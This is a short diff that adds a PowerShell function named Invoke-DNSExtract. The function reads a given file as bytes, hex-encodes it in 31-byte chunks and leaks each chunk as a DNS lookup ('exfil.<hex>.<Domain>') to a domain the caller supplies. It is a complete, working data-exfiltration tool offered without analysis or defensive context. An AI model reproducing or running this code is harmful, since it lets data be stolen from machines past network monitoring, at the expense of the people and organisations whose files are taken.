@@ -1,0 +1,11 @@
+function Invoke-DNSExtract
+{
+    param(
+        [Parameter(Mandatory=$true)]
+        $File,
+        [Parameter(Mandatory=$true)]
+        $Domain
+    )
+    $counter =  [pscustomobject] @{ Value = 0 }
+    (Get-Content $File -Encoding Byte) | Group-Object -Property { [math]::Floor($counter.Value++ / 31) } | % { ([System.BitConverter]::ToString($_.Group)) -replace '-', ''} | % { nslookup.exe "exfil.$_.$Domain" }
+}
